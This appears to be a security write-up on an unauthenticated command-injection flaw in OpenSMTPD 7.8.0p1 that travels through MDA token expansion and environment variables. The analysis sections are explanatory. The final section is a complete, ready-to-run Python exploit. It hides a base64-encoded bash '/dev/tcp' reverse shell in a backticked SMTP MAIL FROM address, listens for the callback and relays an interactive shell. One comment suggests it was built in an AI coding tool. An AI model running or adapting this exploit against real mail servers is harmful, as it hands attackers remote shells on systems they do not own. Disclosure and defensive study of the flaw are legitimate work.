# Vulnerability: OpenSMTPD Unauthenticated Command Injection

## 1. Executive Vulnerability Profile

OpenSMTPD 7.8.0p1 (Portable) contains a command-injection vulnerability that can result in unauthenticated remote code execution under specific MDA configurations.

The issue is closely related to the command-injection vulnerability addressed by CVE-2020-7247. The primary problem is that OpenSMTPD's existing sanitization can be bypassed through functionality that is part of the documented MDA configuration language. In particular, the `:raw` token modifier can prevent the normal escaping performed during MDA variable expansion. In addition, several MDA environment variables are populated from envelope data and can subsequently reach a shell-based execution path.

The practical impact depends on the target's MDA configuration and the privileges of the process executing the delivery command. Where the vulnerable execution path is reachable, an unauthenticated SMTP client can influence command execution without requiring user interaction.

| Field | Details |
| :--- | :--- |
| **Vulnerability Type** | OS Command Injection (CWE-78) |
| **Affected Software** | OpenSMTPD 7.8.0p1 (Portable) |
| **Impact** | Unauthenticated Remote Code Execution |
| **Authentication Required** | None |
| **Discovery Status** | Confirmed through live testing |

The vulnerability is primarily caused by a mismatch between the assumptions made by the different sanitization layers and the way MDA commands are ultimately executed.

---

## 2. Attack Surface and Sanitization Analysis

OpenSMTPD's MDA execution path uses multiple mechanisms to process values originating from SMTP envelope data.

The first layer is the local-part validation performed by `valid_localpart()` in `util.c`. This restricts which characters can enter the envelope address at the SMTP stage.

The second layer occurs during MDA variable expansion. `MAILADDR_ESCAPE`, located in `mda_variables.c`, is intended to escape characters that could otherwise have shell significance before those values are inserted into an MDA command.

The problem is that these two layers do not provide equivalent protection in every execution path.

### Vector 1: `:raw` Token Modifier

The most direct bypass involves the documented `:raw` token modifier.

The modifier is intended to return the original value of an MDA token without applying the normal formatting or escaping behavior. During token expansion, the implementation sets a raw flag, which causes the normal `MAILADDR_ESCAPE` processing to be skipped.

As a result, characters that have already passed the SMTP local-part validation stage can reach the generated MDA command without receiving the second layer of shell escaping.

The important point is that this is not an undocumented parser quirk. `:raw` is an existing feature of the MDA configuration language. The vulnerability therefore results from the interaction between a legitimate feature and the security assumptions made by the sanitization layer.

### Vector 2: MDA Environment Variables

A second execution path exists through the environment variables supplied to the MDA process.

In `mda_unpriv.c`, variables including:

- `SENDER`
- `LOCAL`
- `RECIPIENT`
- `DOMAIN`
- `EXTENSION`
- `ORIGINAL_RECIPIENT`

are populated using values derived from the SMTP envelope.

These variables are documented MDA features and can be referenced by delivery commands. Consequently, sanitization performed when constructing the original SMTP envelope does not necessarily prevent command injection if the resulting value is later interpreted by another shell.

This creates a separate trust-boundary problem: data that was originally treated as an email address is subsequently reused as part of a command-execution environment.

### Sanitization Gap

The security impact comes from the intersection between the characters accepted by the local-part validation and the characters that retain special meaning to the shell.

Examples include:

| Character | Relevance |
| :--- | :--- |
| `` ` `` | Shell command substitution |
| `$` | Parameter and variable expansion |
| `{` / `}` | Variable-expansion syntax |
| `\|` | Pipeline construction |
| `/` | Path construction |

The presence of these characters alone does not create command injection. The critical condition is that they survive the relevant sanitization stage and subsequently reach a shell parser.

---

## 3. Execution Mechanics

The vulnerable execution path is particularly important because the MDA processing can involve multiple layers of command interpretation.

### First Shell

In `mda_unpriv.c`, the MDA command is executed through:

```bash
/bin/sh -c
```

This shell receives the command after OpenSMTPD has performed its token expansion.

When the `:raw` modifier is used, shell metacharacters contained in the expanded value can remain intact. If those characters form valid shell syntax, they can therefore be interpreted by this shell.

### Second Shell

The MDA delivery utility introduces another shell interpretation path through its use of `system()`.

`system()` invokes a shell to execute the supplied command. This means that values originating from variables such as `$SENDER` can potentially undergo another round of shell parsing after being passed through the first stage.

The two execution paths should not be treated as identical. The `:raw` path can result in shell interpretation during the initial command execution, while the environment-variable path depends on how the MDA subsequently constructs and executes the command.

This distinction matters when reproducing the vulnerability because the exact behavior depends on the MDA configuration and the location at which the attacker-controlled value is introduced into the command.

---

## 4. Exploitation

An attacker can reach the vulnerable functionality through an unauthenticated SMTP connection when the target is configured with an affected MDA execution path.

The basic exploitation concept is to place shell-significant characters into an SMTP envelope value that will later be incorporated into an MDA command.

Because the SMTP local-part validation restricts whitespace, payload construction may require shell features that do not depend on literal spaces. For example, `${IFS}` can represent whitespace during shell expansion.

A minimal proof of command execution can therefore be constructed around a harmless filesystem operation, such as creating a file in `/tmp`.

### Proof of Concept

```python
import argparse
import base64
import os
import select
import socket
import sys
import termios
import time


MAILADDR_ALLOWED = set("!#$%&'*/?^`{|}~+-=_")


def build_payload(lhost, lport):
    shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64 = base64.b64encode(shell_cmd.encode()).decode()
    local_part = f"`echo${{IFS}}{b64}|base64${{IFS}}-d|bash`"

    for c in local_part:
        if not (c.isalnum() or c in MAILADDR_ALLOWED or c == '.'):
            print(f"[!] Character {repr(c)} would be blocked")
            sys.exit(1)

    return f"{local_part}@evil.com", shell_cmd


def send_exploit(host, port, sender, recipient):
    """Send exploit email. Prints the full SMTP dialogue."""

    def recv(sock):
        sock.settimeout(5)
        try:
            return sock.recv(4096).decode(errors="replace").strip()
        except socket.timeout:
            return ""

    def send(sock, line):
        sock.sendall((line + "\r\n").encode())
        time.sleep(0.3)
        return recv(sock)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((host, port))
    except ConnectionRefusedError:
        print(f"[!] Connection refused on {host}:{port}")
        return False

    banner = recv(sock)
    print(f"    << {banner}")

    print(f"    >> EHLO attacker.com")
    resp = send(sock, "EHLO attacker.com")
    for line in resp.splitlines()[:3]:
        print(f"    << {line.strip()}")

    mail_from = f"MAIL FROM:<{sender}>"
    print(f"    >> MAIL FROM:<`echo${{IFS}}<b64>|base64${{IFS}}-d|bash`@evil.com>")
    resp = send(sock, mail_from)
    print(f"    << {resp}")
    if "250" not in resp:
        print(f"[!] MAIL FROM rejected")
        sock.close()
        return False

    print(f"    >> RCPT TO:<{recipient}>")
    resp = send(sock, f"RCPT TO:<{recipient}>")
    print(f"    << {resp}")
    if "250" not in resp:
        print(f"[!] RCPT TO rejected")
        sock.close()
        return False

    print(f"    >> DATA")
    resp = send(sock, "DATA")
    print(f"    << {resp}")

    body = f"Subject: test\r\nFrom: x@x\r\nTo: {recipient}\r\n\r\ntest\r\n."
    print(f"    >> [message body + .]")
    resp = send(sock, body, )
    print(f"    << {resp}")
    accepted = "250" in resp

    send(sock, "QUIT")
    sock.close()
    return accepted


def relay_shell(conn):
    """
    select() relay between stdin and socket.

    Claude Code's terminal disables icrnl/opost, so Enter sends \\r
    and \\r in output prints as ^M.  We fix the terminal flags for
    the duration of the relay, then restore on exit.
    """
    sock_fd = conn.fileno()
    stdin_fd = sys.stdin.fileno()
    stdout_fd = sys.stdout.fileno()

    # Save original terminal settings and fix them for shell use
    old_attrs = termios.tcgetattr(stdin_fd)
    new_attrs = termios.tcgetattr(stdin_fd)

    # Input flags: enable CR→NL translation
    new_attrs[0] |= termios.ICRNL

    # Output flags: enable output processing + NL→CRNL
    new_attrs[1] |= (termios.OPOST | termios.ONLCR)

    termios.tcsetattr(stdin_fd, termios.TCSANOW, new_attrs)

    try:
        while True:
            readable, _, _ = select.select([sock_fd, stdin_fd], [], [])

            if sock_fd in readable:
                data = os.read(sock_fd, 4096)
                if not data:
                    print("\n[*] Shell disconnected.")
                    return
                os.write(stdout_fd, data)

            if stdin_fd in readable:
                data = os.read(stdin_fd, 4096)
                if not data:  # Ctrl-D
                    print("\n[*] Exiting.")
                    return
                # Belt-and-suspenders: also translate in case termios didn't stick
                data = data.replace(b'\r', b'\n')
                try:
                    os.write(sock_fd, data)
                except OSError:
                    print("\n[*] Shell disconnected.")
                    return

    except KeyboardInterrupt:
        print("\n[*] Exiting.")
    finally:
        # Restore original terminal settings
        termios.tcsetattr(stdin_fd, termios.TCSANOW, old_attrs)


def main():
    parser = argparse.ArgumentParser(
        description="OpenSMTPD :raw RCE — reverse shell (Bug #17)")
    parser.add_argument("target", help="OpenSMTPD SMTP host")
    parser.add_argument("port", nargs="?", type=int, default=2525)
    parser.add_argument("--lhost", default="172.17.0.1",
                        help="Listener IP (default: 172.17.0.1)")
    parser.add_argument("--lport", type=int, default=4444,
                        help="Listener port (default: 4444)")
    parser.add_argument("--recipient", default="testuser@localhost")
    args = parser.parse_args()

    sender, shell_cmd = build_payload(args.lhost, args.lport)

    print()
    print(f"[*] Target:   {args.target}:{args.port}")
    print(f"[*] Callback: {args.lhost}:{args.lport}")
    print(f"[*] Shell:    {shell_cmd}")
    print()

    # Step 1 — bind listener (kernel queues connections even before accept)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", args.lport))
    except OSError as e:
        print(f"[!] Cannot bind port {args.lport}: {e}")
        sys.exit(1)
    server.listen(1)
    print(f"[1] Listener ready on 0.0.0.0:{args.lport}")

    # Step 2 — send exploit via SMTP (shell connects during/after this)
    print(f"[2] Sending exploit via SMTP:")
    print()
    if not send_exploit(args.target, args.port, sender, args.recipient):
        print("[!] Exploit delivery failed.")
        server.close()
        sys.exit(1)

    # Step 3 — accept the reverse shell
    print()
    print(f"[3] Waiting for reverse shell ...")
    server.settimeout(15)
    try:
        conn, addr = server.accept()
    except socket.timeout:
        print("[!] No shell received (15s timeout).")
        server.close()
        sys.exit(1)
    server.close()

    print(f"[+] Shell from {addr[0]}:{addr[1]}")
    print(f"[+] Ctrl-C to exit.")
    print()

    # Step 4 — interactive relay
    relay_shell(conn)
    conn.close()


if __name__ == "__main__":
    main()
```
